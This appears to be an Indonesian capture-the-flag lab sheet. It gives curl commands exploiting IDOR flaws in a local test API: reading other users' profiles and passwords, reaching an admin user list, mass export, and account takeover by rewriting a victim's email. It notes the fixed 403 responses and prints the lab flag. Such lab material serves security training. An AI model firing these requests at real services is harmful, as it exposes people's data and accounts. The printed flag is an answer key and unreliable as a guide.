# IDOR Lab — set exploit mentah (curl)

Attacker login sebagai id=3. Endpoint-nya:
`GET /api/v1/profile/<id>` · `GET /api/v1/admin/users` · `POST /api/v1/export` · `POST /api/v1/profile/update`

## s1 — Horizontal IDOR
```bash
curl -s http://127.0.0.1:5097/api/v1/profile/2          # profil victim (PII + pass)
curl -s http://127.0.0.1:5097/api/v1/profile/3          # profil sendiri (membandingkan)
```
RENTAN: bisa baca id lain. FIXED: `403: hanya boleh akses profil sendiri`.

## s2 — Vertical IDOR (admin endpoint)
```bash
curl -s http://127.0.0.1:5097/api/v1/admin/users
```
RENTAN: semua user + password + flag admin. FIXED: `403: butuh role admin`.

## s3 — Mass-IDOR export (array id)
```bash
curl -s -X POST http://127.0.0.1:5097/api/v1/export -H "Content-Type: application/json" \
  -d '{"user_ids":[1,2,3]}'
```
RENTAN: export semua. FIXED: `403: export hanya untuk data sendiri`.

## s4 — IDOR → ATO (ganti email korban)
```bash
curl -s -X POST http://127.0.0.1:5097/api/v1/profile/update -H "Content-Type: application/json" \
  -d '{"user_id":2,"email":"attacker@evil.com"}'
```
RENTAN: email VICTIM (id 2) berubah → attacker langsung reset password victim → ATO.
FIXED: `user_id` dipaksa ke sesi attacker → tidak bisa.

Flag: `IDOR-LAB{Flag_IDOR_Horizontal_Vertical_Bypass_2217}` (di profil admin)